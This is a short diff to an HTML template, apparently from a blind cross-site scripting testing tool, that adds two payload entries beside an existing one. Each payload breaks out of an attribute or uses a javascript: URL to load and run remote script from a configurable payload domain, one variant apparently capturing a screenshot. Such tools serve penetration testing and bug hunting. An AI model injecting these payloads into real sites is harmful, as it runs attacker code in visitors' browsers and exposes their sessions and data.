@@ -39,6 +39,12 @@
 
                   <label class="control-label">Create Element</label>
                   <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')" disabled class="form-control">
+                  
+                  <label class="control-label">Img import</label>
+                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/i')>">
+                  
+                  <label class="control-label">Img import with screenshot</label>
+                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/s')>">
                 </div>
               </div>
             </div>
